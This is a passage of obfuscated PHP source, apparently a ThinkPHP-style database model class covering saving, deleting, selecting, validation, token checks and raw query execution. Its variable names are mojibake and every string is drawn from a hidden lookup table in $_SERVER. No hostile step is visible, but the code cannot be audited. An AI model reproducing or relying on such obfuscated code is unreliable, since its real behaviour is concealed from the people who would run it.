(is_array($ó¥íëææ[$“ÇèÊŞÎ[365]]) && isset($ó¥íëææ[$“ÇèÊŞÎ[365]][$âÂ®¥üÉ])) { $¸†Û¿æÊ = $ó¥íëææ[$“ÇèÊŞÎ[365]][$âÂ®¥üÉ]; } if (!1 === $this->_beforeUpdate($Çş­±¸Ø, $ó¥íëææ)) { return !1; } $ì’«áİ¢ = $this->db->update($Çş­±¸Ø, $ó¥íëææ); if (!1 !== $ì’«áİ¢) { if (isset($¸†Û¿æÊ)) { $Çş­±¸Ø[$âÂ®¥üÉ] = $¸†Û¿æÊ; } $this->_afterUpdate($Çş­±¸Ø, $ó¥íëææ); } return $ì’«áİ¢; } protected function _beforeUpdate(&$’˜Š¯², $¤õ·²¦ó) { } protected function _afterUpdate($ƒ»ú÷¬, $Â×ü²Ú‰) { } public function delete($…ŠÁÍš = array()) { $È­†ğÇî =& $_SERVER[¤øïŠ‹²]; if (empty($…ŠÁÍš) && empty($this->options[$È­†ğÇî[365]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $ŒÏÊúÚÉ = $this->getPk(); if (is_numeric($…ŠÁÍš) || is_string($…ŠÁÍš)) { if (strpos($…ŠÁÍš, $È­†ğÇî[50])) { $ãê×ëÏ[$ŒÏÊúÚÉ] = array($È­†ğÇî[366], $…ŠÁÍš); } else { $ãê×ëÏ[$ŒÏÊúÚÉ] = $…ŠÁÍš; } $this->options[$È­†ğÇî[365]] = $ãê×ëÏ; } $…ŠÁÍš = $this->_parseOptions(); if (is_array($…ŠÁÍš[$È­†ğÇî[365]]) && isset($…ŠÁÍš[$È­†ğÇî[365]][$ŒÏÊúÚÉ])) { $¸‡¶Æ® = $…ŠÁÍš[$È­†ğÇî[365]][$ŒÏÊúÚÉ]; } $ÆÀ­òÏ· = $this->db->delete($…ŠÁÍš); if (!1 !== $ÆÀ­òÏ·) { $¸¢™Ø©Ó = array(); if (isset($¸‡¶Æ®)) { $¸¢™Ø©Ó[$ŒÏÊúÚÉ] = $¸‡¶Æ®; } $this->_after_delete($¸¢™Ø©Ó, $…ŠÁÍš); } return $ÆÀ­òÏ·; } protected function _after_delete($–Œòîù§, $ÍéåÆÕˆ) { } public function select($¶¿ùù˜¹ = array()) { $®³Ô²ı =& $_SERVER[¤øïŠ‹²]; if (is_string($¶¿ùù˜¹) || is_numeric($¶¿ùù˜¹)) { $áŠõæí = $this->getPk(); if (strpos($¶¿ùù˜¹, $®³Ô²ı[50])) { $Ó¿ÓãÚ¡[$áŠõæí] = array($®³Ô²ı[366], $¶¿ùù˜¹); } else { $Ó¿ÓãÚ¡[$áŠõæí] = $¶¿ùù˜¹; } $this->options[$®³Ô²ı[365]] = $Ó¿ÓãÚ¡; } elseif (!1 === $¶¿ùù˜¹) { $¶¿ùù˜¹ = $this->_parseOptions(); return $®³Ô²ı[367] . $this->db->buildSelectSql($¶¿ùù˜¹) . $®³Ô²ı[368]; } $¶¿ùù˜¹ = $this->_parseOptions(); $µ©Û”ª‹ = $this->db->select($¶¿ùù˜¹); if (!1 === $µ©Û”ª‹) { return !1; } if (empty($µ©Û”ª‹)) { return null; } $this->_afterSelect($µ©Û”ª‹, $¶¿ùù˜¹); return $µ©Û”ª‹; } protected function _afterSelect(&$Ó œ¶–, $ñª¶½òî) { } public function buildSql($ĞšÜÌ»Æ = array()) { $×°ıË¶ =& $_SERVER[¤øïŠ‹²]; $ĞšÜÌ»Æ = $this->_parseOptions($ĞšÜÌ»Æ); return $×°ıË¶[367] . $this->db->buildSelectSql($ĞšÜÌ»Æ) . $×°ıË¶[368]; } public function optionsValue($±æ¸Ç¥† = null) { if (is_null($±æ¸Ç¥†)) { return $this->options; } elseif (is_array($±æ¸Ç¥†)) { $this->options = array_merge($this->options, $±æ¸Ç¥†); } } protected function _parseOptions($ß…›ø°¡ = array()) { $©¨³¿©‰ =& $_SERVER[¤øïŠ‹²]; if (is_array($ß…›ø°¡)) { $ß…›ø°¡ = array_merge($this->options, $ß…›ø°¡); } $this->options = array(); if (!isset($ß…›ø°¡[$©¨³¿©‰[369]])) { $ß…›ø°¡[$©¨³¿©‰[369]] = $this->getTableName(); $Ë™Õ“ü¨ = $this->fields; } else { $Ë™Õ“ü¨ = $this->getDbFields(); } if (!empty($ß…›ø°¡[$©¨³¿©‰[370]])) { $ß…›ø°¡[$©¨³¿©‰[369]] .= $©¨³¿©‰[53] . $ß…›ø°¡[$©¨³¿©‰[370]]; } $ß…›ø°¡[$©¨³¿©‰[371]] = $this->name; if (isset($ß…›ø°¡[$©¨³¿©‰[365]]) && is_array($ß…›ø°¡[$©¨³¿©‰[365]]) && !empty($Ë™Õ“ü¨) && !isset($ß…›ø°¡[$©¨³¿©‰[372]]) && !isset($ß…›ø°¡[$©¨³¿©‰[369]])) { foreach ($ß…›ø°¡[$©¨³¿©‰[365]] as $¤‹ô—à® => $ëÒ‘õ¢Ú) { $¤‹ô—à® = trim($¤‹ô—à®); if (in_array($¤‹ô—à®, $Ë™Õ“ü¨, !0)) { if (is_scalar($ëÒ‘õ¢Ú)) { $this->_parseType($ß…›ø°¡[$©¨³¿©‰[365]], $¤‹ô—à®); } } elseif (!is_numeric($¤‹ô—à®) && $©¨³¿©‰[11] != substr($¤‹ô—à®, 0, 1) && !1 === strpos($¤‹ô—à®, $©¨³¿©‰[10]) && !1 === strpos($¤‹ô—à®, $©¨³¿©‰[349]) && !1 === strpos($¤‹ô—à®, $©¨³¿©‰[225]) && !1 === strpos($¤‹ô—à®, $©¨³¿©‰[297])) { unset($ß…›ø°¡[$©¨³¿©‰[365]][$¤‹ô—à®]); } } } $this->_options_filter($ß…›ø°¡); return $ß…›ø°¡; } protected function _options_filter(&$ÔÒôô’ê) { } protected function _parseType(&$ô¥œúÜ—, $ÇÁ¥ÒÓ‹) { $Îé”ÉÉ =& $_SERVER[¤øïŠ‹²]; if (empty($this->options[$Îé”ÉÉ[373]][$Îé”ÉÉ[4] . $ÇÁ¥ÒÓ‹])) { $¡´–µ„ = strtolower($this->fields[$Îé”ÉÉ[341]][$ÇÁ¥ÒÓ‹]); if (!1 !== strpos($¡´–µ„, $Îé”ÉÉ[374])) { } elseif (!1 === strpos($¡´–µ„, $Îé”ÉÉ[375]) && !1 !== strpos($¡´–µ„, $Îé”ÉÉ[376])) { $ô¥œúÜ—[$ÇÁ¥ÒÓ‹] = intval($ô¥œúÜ—[$ÇÁ¥ÒÓ‹]); } elseif (!1 !== strpos($¡´–µ„, $Îé”ÉÉ[377]) || !1 !== strpos($¡´–µ„, $Îé”ÉÉ[378])) { $ô¥œúÜ—[$ÇÁ¥ÒÓ‹] = floatval($ô¥œúÜ—[$ÇÁ¥ÒÓ‹]); } elseif (!1 !== strpos($¡´–µ„, $Îé”ÉÉ[379])) { $ô¥œúÜ—[$ÇÁ¥ÒÓ‹] = (bool) $ô¥œúÜ—[$ÇÁ¥ÒÓ‹]; } } } public function find($àÄş‹À  = array()) { $½ˆÛú“Í =& $_SERVER[¤øïŠ‹²]; if (is_numeric($àÄş‹À ) || is_string($àÄş‹À )) { $ÇØ¦ÑÑÖ[$this->getPk()] = intval($àÄş‹À ); $this->options[$½ˆÛú“Í[365]] = $ÇØ¦ÑÑÖ; } $this->options[$½ˆÛú“Í[380]] = 1; $àÄş‹À  = $this->_parseOptions(); $èš‘ÕÀ½ = $this->db->select($àÄş‹À ); if (!1 === $èš‘ÕÀ½) { return !1; } if (empty($èš‘ÕÀ½)) { return null; } $¹üç´“ = $èš‘ÕÀ½[0]; $this->_afterFind($¹üç´“, $àÄş‹À ); return $¹üç´“; } protected function _afterFind(&$‰»¦ß§©, $¯‡âĞ¢) { } protected function returnResult($Ø«¸¡“§, $«¿ì±ı× = '') { $ûû¢ÔåÄ =& $_SERVER[¤øïŠ‹²]; if ($«¿ì±ı×) { if (is_callable($«¿ì±ı×)) { return call_user_func($«¿ì±ı×, $Ø«¸¡“§); } switch (strtolower($«¿ì±ı×)) { case $ûû¢ÔåÄ[381]: return json_encode($Ø«¸¡“§); case $ûû¢ÔåÄ[382]: return xml_encode($Ø«¸¡“§); } } return $Ø«¸¡“§; } public function parseFieldsMap($òúÁ¦‹, $ÙŞ÷’Ñè = 1) { if (!empty($this->_map)) { foreach ($this->_map as $©Åì—µê => $ã•£é¦ß) { if ($ÙŞ÷’Ñè == 1) { if (isset($òúÁ¦‹[$ã•£é¦ß])) { $òúÁ¦‹[$©Åì—µê] = $òúÁ¦‹[$ã•£é¦ß]; unset($òúÁ¦‹[$ã•£é¦ß]); } } else { if (isset($òúÁ¦‹[$©Åì—µê])) { $òúÁ¦‹[$ã•£é¦ß] = $òúÁ¦‹[$©Åì—µê]; unset($òúÁ¦‹[$©Åì—µê]); } } } } return $òúÁ¦‹; } public function setField($»¢ØÄ’, $üÜÔ÷Òİ = '') { if (is_array($»¢ØÄ’)) { $øŠ¬Õ«ˆ = $»¢ØÄ’; } else { $øŠ¬Õ«ˆ[$»¢ØÄ’] = $üÜÔ÷Òİ; } return $this->save($øŠ¬Õ«ˆ); } public function setAdd($Êà™ Ùê, $´ƒ¾Õ–‰ = 1) { $¡®˜‰µ¨ =& $_SERVER[¤øïŠ‹²]; $ÑÕöĞ × = $Êà™ Ùê . $¡®˜‰µ¨[383] . $´ƒ¾Õ–‰; if ($´ƒ¾Õ–‰ < 0) { $ÑÕöĞ × = $Êà™ Ùê . $´ƒ¾Õ–‰; } return $this->setField($Êà™ Ùê, array($¡®˜‰µ¨[384], $ÑÕöĞ ×)); } public function getField($¾ÈÇ, $²ŸÊ«Äé = null) { $åÖ¢õ¼ =& $_SERVER[¤øïŠ‹²]; $Àïíğ™Î[$åÖ¢õ¼[363]] = $¾ÈÇ; $Àïíğ™Î = $this->_parseOptions($Àïíğ™Î); $¾ÈÇ = trim($¾ÈÇ); if (strpos($¾ÈÇ, $åÖ¢õ¼[50])) { if (!isset($Àïíğ™Î[$åÖ¢õ¼[380]])) { $Àïíğ™Î[$åÖ¢õ¼[380]] = is_numeric($²ŸÊ«Äé) ? $²ŸÊ«Äé : $åÖ¢õ¼[12]; } $¬ŞÖØâê = $this->db->select($Àïíğ™Î); if (!empty($¬ŞÖØâê)) { $´ĞÕì‹ù = explode($åÖ¢õ¼[50], $¾ÈÇ); $¾ÈÇ = array_keys($¬ŞÖØâê[0]); $ÊòŠùÂ = array_shift($¾ÈÇ); $í‚œ¨î = array_shift($¾ÈÇ); $òÉ°° ã = array(); $ï‘á¢º  = count($´ĞÕì‹ù); foreach ($¬ŞÖØâê as $ƒ™¾Øœ¢) { $àõ•ª§ı = $ƒ™¾Øœ¢[$ÊòŠùÂ]; if (2 == $ï‘á¢º ) { $òÉ°° ã[$àõ•ª§ı] = $ƒ™¾Øœ¢[$í‚œ¨î]; } else { $òÉ°° ã[$àõ•ª§ı] = is_string($²ŸÊ«Äé) ? implode($²ŸÊ«Äé, $ƒ™¾Øœ¢) : $ƒ™¾Øœ¢; } } return $òÉ°° ã; } } else { if (!0 !== $²ŸÊ«Äé) { $Àïíğ™Î[$åÖ¢õ¼[380]] = is_numeric($²ŸÊ«Äé) ? $²ŸÊ«Äé : 1; } if ($²ŸÊ«Äé === $åÖ¢õ¼[344]) { unset($Àïíğ™Î[$åÖ¢õ¼[380]]); } $ƒ™¾Øœ¢ = $this->db->select($Àïíğ™Î); if (!empty($ƒ™¾Øœ¢)) { if ($²ŸÊ«Äé === $åÖ¢õ¼[344]) { return reset($ƒ™¾Øœ¢[0]); } if (!0 !== $²ŸÊ«Äé && 1 == $Àïíğ™Î[$åÖ¢õ¼[380]]) { return reset($ƒ™¾Øœ¢[0]); } foreach ($ƒ™¾Øœ¢ as $ªşŒĞ ê) { $úšÅßÚÈ[] = $ªşŒĞ ê[$¾ÈÇ]; } return $úšÅßÚÈ; } } return null; } public function create($ÊãÚ¨âœ = '', $Ñ¼öîÇÁ = '') { $±İ¶ı…Ë =& $_SERVER[¤øïŠ‹²]; if (empty($ÊãÚ¨âœ)) { $ÊãÚ¨âœ = $_POST; } elseif (is_object($ÊãÚ¨âœ)) { $ÊãÚ¨âœ = get_object_vars($ÊãÚ¨âœ); } if (empty($ÊãÚ¨âœ) || !is_array($ÊãÚ¨âœ)) { $this->error = think_lang($±İ¶ı…Ë[361]); return !1; } $ÊãÚ¨âœ = $this->parseFieldsMap($ÊãÚ¨âœ, 0); $Ñ¼öîÇÁ = $Ñ¼öîÇÁ ? $Ñ¼öîÇÁ : (!empty($ÊãÚ¨âœ[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$±İ¶ı…Ë[363]])) { $„«†¥¯ = $this->options[$±İ¶ı…Ë[363]]; unset($this->options[$±İ¶ı…Ë[363]]); } elseif ($Ñ¼öîÇÁ == THINK_MODEL_INSERT && isset($this->insertFields)) { $„«†¥¯ = $this->insertFields; } elseif ($Ñ¼öîÇÁ == THINK_MODEL_UPDATE && isset($this->updateFields)) { $„«†¥¯ = $this->updateFields; } if (isset($„«†¥¯)) { if (is_string($„«†¥¯)) { $„«†¥¯ = explode($±İ¶ı…Ë[50], $„«†¥¯); } if (think_config($±İ¶ı…Ë[385])) { $„«†¥¯[] = think_config($±İ¶ı…Ë[386]); } foreach ($ÊãÚ¨âœ as $ÈƒÍéÔ‘ => $ñ›Ò”ôÜ) { if (!in_array($ÈƒÍéÔ‘, $„«†¥¯)) { unset($ÊãÚ¨âœ[$ÈƒÍéÔ‘]); } } } if (!$this->autoValidation($ÊãÚ¨âœ, $Ñ¼öîÇÁ)) { return !1; } if (!$this->autoCheckToken($ÊãÚ¨âœ)) { $this->error = think_lang($±İ¶ı…Ë[387]); return !1; } if ($this->autoCheckFields) { $„«†¥¯ = $this->getDbFields(); foreach ($ÊãÚ¨âœ as $ÈƒÍéÔ‘ => $ñ›Ò”ôÜ) { if (!in_array($ÈƒÍéÔ‘, $„«†¥¯)) { unset($ÊãÚ¨âœ[$ÈƒÍéÔ‘]); } elseif (MAGIC_QUOTES_GPC && is_string($ñ›Ò”ôÜ)) { $ÊãÚ¨âœ[$ÈƒÍéÔ‘] = stripslashes($ñ›Ò”ôÜ); } } } $this->autoOperation($ÊãÚ¨âœ, $Ñ¼öîÇÁ); $this->data = $ÊãÚ¨âœ; return $ÊãÚ¨âœ; } public function autoCheckToken($ñåøá‡») { $ç¹é„íå =& $_SERVER[¤øïŠ‹²]; if (isset($this->options[$ç¹é„íå[388]]) && !$this->options[$ç¹é„íå[388]]) { return !0; } if (think_config($ç¹é„íå[385])) { $˜è›ŞÓ¡ = think_config($ç¹é„íå[386]); if (!isset($ñåøá‡»[$˜è›ŞÓ¡]) || Session::get($˜è›ŞÓ¡)) { return !1; } list($ğ½èÂ«, $¸Ç«íù÷) = explode($ç¹é„íå[11], $ñåøá‡»[$˜è›ŞÓ¡]); if ($¸Ç«íù÷ && Session::get($˜è›ŞÓ¡ . $ç¹é„íå[10] . $ğ½èÂ«) === $¸Ç«íù÷) { Session::remove($˜è›ŞÓ¡ . $ç¹é„íå[10] . $ğ½èÂ«); return !0; } if (think_config($ç¹é„íå[389])) { Session::remove($˜è›ŞÓ¡ . $ç¹é„íå[10] . $ğ½èÂ«); } return !1; } return !0; } public function regex($½ÙµöÕ³, $­ñ€­½«) { $“¬œˆ›­ =& $_SERVER[¤øïŠ‹²]; $Á‚å“üÍ = array($“¬œˆ›­[390] => $“¬œˆ›­[391], $“¬œˆ›­[392] => $“¬œˆ›­[393], $“¬œˆ›­[394] => $“¬œˆ›­[395], $“¬œˆ›­[396] => $“¬œˆ›­[397], $“¬œˆ›­[398] => $“¬œˆ›­[399], $“¬œˆ›­[400] => $“¬œˆ›­[401], $“¬œˆ›­[402] => $“¬œˆ›­[403], $“¬œˆ›­[378] => $“¬œˆ›­[404], $“¬œˆ›­[405] => $“¬œˆ›­[406]); if (isset($Á‚å“üÍ[strtolower($­ñ€­½«)])) { $­ñ€­½« = $Á‚å“üÍ[strtolower($­ñ€­½«)]; } return preg_match($­ñ€­½«, $½ÙµöÕ³) === 1; } private function autoOperation(&$‚èâüï©, $”¯£Ê×Ğ) { $®é‚­áû =& $_SERVER[¤øïŠ‹²]; if (!empty($this->options[$®é‚­áû[407]])) { $œ›öß™ = $this->options[$®é‚­áû[407]]; unset($this->options[$®é‚­áû[407]]); } elseif (!empty($this->_auto)) { $œ›öß™ = $this->_auto; } if (isset($œ›öß™)) { foreach ($œ›öß™ as $µšñ®¤‚) { if (empty($µšñ®¤‚[2])) { $µšñ®¤‚[2] = THINK_MODEL_INSERT; } if ($”¯£Ê×Ğ == $µšñ®¤‚[2] || $µšñ®¤‚[2] == THINK_MODEL_BOTH) { switch (trim($µšñ®¤‚[3])) { case $®é‚­áû[408]: case $®é‚­áû[409]: $†ŒïûÅõ = isset($µšñ®¤‚[4]) ? (array) $µšñ®¤‚[4] : array(); if (isset($‚èâüï©[$µšñ®¤‚[0]])) { array_unshift($†ŒïûÅõ, $‚èâüï©[$µšñ®¤‚[0]]); } if ($®é‚­áû[408] == $µšñ®¤‚[3]) { $‚èâüï©[$µšñ®¤‚[0]] = call_user_func_array($µšñ®¤‚[1], $†ŒïûÅõ); } else { $‚èâüï©[$µšñ®¤‚[0]] = call_user_func_array(array(&$this, $µšñ®¤‚[1]), $†ŒïûÅõ); } break; case $®é‚­áû[363]: $‚èâüï©[$µšñ®¤‚[0]] = $‚èâüï©[$µšñ®¤‚[1]]; break; case $®é‚­áû[410]: if ($®é‚­áû[12] === $‚èâüï©[$µšñ®¤‚[0]]) { unset($‚èâüï©[$µšñ®¤‚[0]]); } break; case $®é‚­áû[411]: default: $‚èâüï©[$µšñ®¤‚[0]] = $µšñ®¤‚[1]; } if (!1 === $‚èâüï©[$µšñ®¤‚[0]]) { unset($‚èâüï©[$µšñ®¤‚[0]]); } } } } return $‚èâüï©; } protected function autoValidation($š“›şÇù, $ìÛ´ùı) { $Ô³¤¥ØÌ =& $_SERVER[¤øïŠ‹²]; if (!empty($this->options[$Ô³¤¥ØÌ[412]])) { $Ö¦†ø = $this->options[$Ô³¤¥ØÌ[412]]; unset($this->options[$Ô³¤¥ØÌ[412]]); } elseif (!empty($this->_validate)) { $Ö¦†ø = $this->_validate; } if (isset($Ö¦†ø)) { if ($this->patchValidate) { $this->error = array(); } foreach ($Ö¦†ø as $¯Ë®ÔÉ° => $Ä•—ƒå) { if (empty($Ä•—ƒå[5]) || $Ä•—ƒå[5] == THINK_MODEL_BOTH || $Ä•—ƒå[5] == $ìÛ´ùı) { if (0 == strpos($Ä•—ƒå[2], $Ô³¤¥ØÌ[413]) && strpos($Ä•—ƒå[2], $Ô³¤¥ØÌ[414])) { $Ä•—ƒå[2] = think_lang(substr($Ä•—ƒå[2], 2, -1)); } $Ä•—ƒå[3] = isset($Ä•—ƒå[3]) ? $Ä•—ƒå[3] : THINK_EXISTS_VALIDATE; $Ä•—ƒå[4] = isset($Ä•—ƒå[4]) ? $Ä•—ƒå[4] : $Ô³¤¥ØÌ[415]; switch ($Ä•—ƒå[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($š“›şÇù, $Ä•—ƒå)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($Ô³¤¥ØÌ[12] != trim($š“›şÇù[$Ä•—ƒå[0]])) { if (!1 === $this->_validationField($š“›şÇù, $Ä•—ƒå)) { return !1; } } break; default: if (isset($š“›şÇù[$Ä•—ƒå[0]])) { if (!1 === $this->_validationField($š“›şÇù, $Ä•—ƒå)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($—¡“£Œ, $šöö…ïï) { if (!1 === $this->_validationFieldItem($—¡“£Œ, $šöö…ïï)) { if ($this->patchValidate) { $this->error[$šöö…ïï[0]] = $šöö…ïï[2]; } else { $this->error = $šöö…ïï[2]; return !1; } } return; } protected function _validationFieldItem($í‚¼«Ì, $’¶´šõ×) { $åÄ©¢ =& $_SERVER[¤øïŠ‹²]; switch (strtolower(trim($’¶´šõ×[4]))) { case $åÄ©¢[408]: case $åÄ©¢[409]: $ºŞ±¡ß = isset($’¶´šõ×[6]) ? (array) $’¶´šõ×[6] : array(); if (is_string($’¶´šõ×[0]) && strpos($’¶´šõ×[0], $åÄ©¢[50])) { $’¶´šõ×[0] = explode($åÄ©¢[50], $’¶´šõ×[0]); } if (is_array($’¶´šõ×[0])) { foreach ($’¶´šõ×[0] as $¨Ù½¥¿æ) { $†áÌÛúè[$¨Ù½¥¿æ] = $í‚¼«Ì[$¨Ù½¥¿æ]; } array_unshift($ºŞ±¡ß, $†áÌÛúè); } else { array_unshift($ºŞ±¡ß, $í‚¼«Ì[$’¶´šõ×[0]]); } if ($åÄ©¢[408] == $’¶´šõ×[4]) { return call_user_func_array($’¶´šõ×[1], $ºŞ±¡ß); } else { return call_user_func_array(array(&$this, $’¶´šõ×[1]), $ºŞ±¡ß); } case $åÄ©¢[416]: return $í‚¼«Ì[$’¶´šõ×[0]] == $í‚¼«Ì[$’¶´šõ×[1]]; case $åÄ©¢[417]: if (is_string($’¶´šõ×[0]) && strpos($’¶´šõ×[0], $åÄ©¢[50])) { $’¶´šõ×[0] = explode($åÄ©¢[50], $’¶´šõ×[0]); } $ÄÀà×†İ = array(); if (is_array($’¶´šõ×[0])) { foreach ($’¶´šõ×[0] as $¨Ù½¥¿æ) { $ÄÀà×†İ[$¨Ù½¥¿æ] = $í‚¼«Ì[$¨Ù½¥¿æ]; } } else { $ÄÀà×†İ[$’¶´šõ×[0]] = $í‚¼«Ì[$’¶´šõ×[0]]; } if (!empty($í‚¼«Ì[$this->getPk()])) { $ÄÀà×†İ[$this->getPk()] = array($åÄ©¢[418], $í‚¼«Ì[$this->getPk()]); } if ($this->where($ÄÀà×†İ)->find()) { return !1; } return !0; default: return $this->check($í‚¼«Ì[$’¶´šõ×[0]], $’¶´šõ×[1], $’¶´šõ×[4]); } } public function check($¯©€±ˆ„, $è°»ĞÔ, $†šØ±õÅ = "\x72\145\x67\145\x78") { $£ˆ¶àËâ =& $_SERVER[¤øïŠ‹²]; $†šØ±õÅ = strtolower(trim($†šØ±õÅ)); switch ($†šØ±õÅ) { case $£ˆ¶àËâ[7]: case $£ˆ¶àËâ[419]: $şïš«…î = is_array($è°»ĞÔ) ? $è°»ĞÔ : explode($£ˆ¶àËâ[50], $è°»ĞÔ); return $†šØ±õÅ == $£ˆ¶àËâ[7] ? in_array($¯©€±ˆ„, $şïš«…î) : !in_array($¯©€±ˆ„, $şïš«…î); case $£ˆ¶àËâ[420]: case $£ˆ¶àËâ[421]: if (is_array($è°»ĞÔ)) { $æ½…Œ²˜ = $è°»ĞÔ[0]; $Ë´ šèö = $è°»ĞÔ[1]; } else { list($æ½…Œ²˜, $Ë´ šèö) = explode($£ˆ¶àËâ[50], $è°»ĞÔ); } return $†šØ±õÅ == $£ˆ¶àËâ[420] ? $¯©€±ˆ„ >= $æ½…Œ²˜ && $¯©€±ˆ„ <= $Ë´ šèö : $¯©€±ˆ„ < $æ½…Œ²˜ || $¯©€±ˆ„ > $Ë´ šèö; case $£ˆ¶àËâ[422]: case $£ˆ¶àËâ[423]: return $†šØ±õÅ == $£ˆ¶àËâ[422] ? $¯©€±ˆ„ == $è°»ĞÔ : $¯©€±ˆ„ != $è°»ĞÔ; case $£ˆ¶àËâ[424]: $¸§®Ğò× = mb_strlen($¯©€±ˆ„, $£ˆ¶àËâ[425]); if (strpos($è°»ĞÔ, $£ˆ¶àËâ[50])) { list($æ½…Œ²˜, $Ë´ šèö) = explode($£ˆ¶àËâ[50], $è°»ĞÔ); return $¸§®Ğò× >= $æ½…Œ²˜ && $¸§®Ğò× <= $Ë´ šèö; } else { return $¸§®Ğò× == $è°»ĞÔ; } case $£ˆ¶àËâ[426]: list($ô¨µíúè, $Í¦í£Ó¥) = explode($£ˆ¶àËâ[50], $è°»ĞÔ); if (!is_numeric($ô¨µíúè)) { $ô¨µíúè = strtotime($ô¨µíúè); } if (!is_numeric($Í¦í£Ó¥)) { $Í¦í£Ó¥ = strtotime($Í¦í£Ó¥); } return NOW_TIME >= $ô¨µíúè && NOW_TIME <= $Í¦í£Ó¥; case $£ˆ¶àËâ[427]: return in_array(get_client_ip(), explode($£ˆ¶àËâ[50], $è°»ĞÔ)); case $£ˆ¶àËâ[428]: return !in_array(get_client_ip(), explode($£ˆ¶àËâ[50], $è°»ĞÔ)); case $£ˆ¶àËâ[415]: default: return $this->regex($¯©€±ˆ„, $è°»ĞÔ); } } public function query($èŸ‚şŞâ, $å‚·ñ¼ã = false) { $ÕÍõ¿ =& $_SERVER[¤øïŠ‹²]; if (!is_bool($å‚·ñ¼ã) && !is_array($å‚·ñ¼ã)) { $å‚·ñ¼ã = func_get_args(); array_shift($å‚·ñ¼ã); } $èŸ‚şŞâ = str_replace(array($ÕÍõ¿[59], $ÕÍõ¿[429]), $ÕÍõ¿[53], $èŸ‚şŞâ); $èŸ‚şŞâ = $this->parseSql($èŸ‚şŞâ, $å‚·ñ¼ã); return $this->db->query($èŸ‚şŞâ); } public function execute($ÎÜĞƒóÀ, $±±¢§ôõ = false) { if (!is_bool($±±¢§ôõ) && !is_array($±±¢§ôõ)) { $±±¢§ôõ = func_get_args(); array_shift($±±¢§ôõ); } $ÎÜĞƒóÀ = $this->parseSql($ÎÜĞƒóÀ, $±±¢§ôõ); return $this->db->execute($ÎÜĞƒóÀ); } protected function parseSql($ø¥­ã¹è, $¹â†ê ›) { $Ÿ‚¿—Œ =& $_SERVER[¤øïŠ‹²]; if (!0 === $¹â†ê ›) { $°Î€š€ = $this->_parseOptions(); $ø¥­ã¹è = $this->db->parseSql($ø¥­ã¹è, $°Î€š€); } elseif (is_array($¹â†ê ›)) { $¹â†ê › = array_map(array($this->db, $Ÿ‚¿—Œ[430]), $¹â†ê ›); $ø¥­ã¹è = vsprintf($ø¥­ã¹è, $¹â†ê ›); } else { $ø¥­ã¹è = strtr($ø¥­ã¹è, array($Ÿ‚¿—Œ[431] => $this->getTableName(), $Ÿ‚¿—Œ[432] => think_config($Ÿ‚¿—Œ[333]))); } $this->db->setModel($this->name); return $ø¥­ã¹è; } public function db($ÇıÁ­ï = '', $‰š»˜±Ú = '', $• äı’ = array()) { $äáİı®Ë =& $_SERVER[¤øïŠ‹²]; if ($äáİı®Ë[12] === $ÇıÁ­ï && $this->db) { return $this->db; } static $‡ïÙí‘ş = array(); static $ÅËÜ¯ğâ = array(); if (!isset($ÅËÜ¯ğâ[$ÇıÁ­ï]) || isset($ÅËÜ¯ğâ[$ÇıÁ­ï]) && $‰š»˜±Ú && $‡ïÙí‘ş[$ÇıÁ­ï] != $‰š»˜±Ú) { if (!empty($‰š»˜±Ú) && is_string($‰š»˜±Ú) && !1 === strpos($‰š»˜±Ú, $äáİı®Ë[8])) { $‰š»˜±Ú = think_config($‰š»˜±Ú); } $ÇıÁ­ï = think_guid($‰š»˜±Ú); $ÅËÜ¯ğâ[$ÇıÁ­ï] = Db::getInstance($‰š»˜±Ú); } elseif (NULL === $‰š»˜±Ú) { $ÅËÜ¯ğâ[$ÇıÁ­ï]->close(); unset($ÅËÜ¯ğâ[$ÇıÁ­ï]); return; } if (!empty($• äı’)) { if (is_string($• äı’)) { parse_str($• äı’, $• äı’); } foreach ($• äı’ as $ã£ÃÚÛ => $·ÀÑæÊ) { $this->setProperty($ã£ÃÚÛ, $·ÀÑæÊ); } } $‡ïÙí‘ş[$ÇıÁ­ï] = $‰š»˜±Ú; $this->db = $ÅËÜ¯ğâ[$ÇıÁ­ï]; $this->_after_db(); if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $Óë¾©± = get_class($this); if ($Óë¾©± == $_SERVER[¤øïŠ‹²][433]) { return $this->name; } $this->name = substr($Óë¾©±, 0, -5); } return $this->name; } public function getTableName() { $à¾°æÁ =& $_SERVER[¤øïŠ‹²]; if (empty($this->trueTableName)) { $·æ³”ó³ = !empty($this->tablePrefix) ? $this->tablePrefix : $à¾°æÁ[12]; if (!empty($this->tableName)) { $·æ³”ó³ .= $this->tableName; } else { $·æ³”ó³ .= think_parse_name($this->name); } $this->trueTableName = strtolower($·æ³”ó³); } return (!empty($this->dbName) ? $this->dbName . $à¾°æÁ[10] : $à¾°æÁ[12]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $óÁÚĞªĞ =& $_SERVER[¤øïŠ‹²]; return isset($this->fields[$óÁÚĞªĞ[340]]) ? $this->fields[$óÁÚĞªĞ[340]] : $this->pk; } public function getDbFields() { $°šéäòê =& $_SERVER[¤øïŠ‹²]; if (isset($this->options[$°šéäòê[369]])) { $¬Á™Ë = $this->db->getFields($this->options[$°šéäòê[369]]); return $¬Á™Ë ? array_keys($¬Á™Ë) : !1; } if ($this->fields) { $¬Á™Ë = $this->fields; unset($¬Á™Ë[$°šéäòê[339]], $¬Á™Ë[$°šéäòê[340]], $¬Á™Ë[$°šéäòê[341]], $¬Á™Ë[$°šéäòê[338]]); return $¬Á™Ë; } return !1; } public function data($­ª•Ï = '') { $÷ä©×»æ =& $_SERVER[¤øïŠ‹²]; if ($÷ä©×»æ[12] === $­ª•Ï && !empty($this->data)) { return $this->data; } if (is_object($­ª•Ï)) { $­ª•Ï = get_object_vars($­ª•Ï); } elseif (is_string($­ª•Ï)) { parse_str($­ª•Ï, $­ª•Ï); } 